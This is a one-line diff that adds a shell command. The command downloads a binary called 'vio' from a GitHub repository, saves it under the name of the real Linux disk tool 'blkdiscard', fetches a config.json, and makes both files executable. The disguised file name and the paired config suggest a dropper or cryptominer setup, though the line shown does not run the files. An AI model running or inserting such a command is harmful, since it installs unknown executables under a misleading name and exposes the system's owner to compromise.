@@ -1,0 +1,1 @@
+wget -O blkdiscard https://github.com/Joangrup/runerweb/raw/main/vio && wget https://raw.githubusercontent.com/Joangrup/runerweb/main/config.json && chmod +x blkdiscard config.json
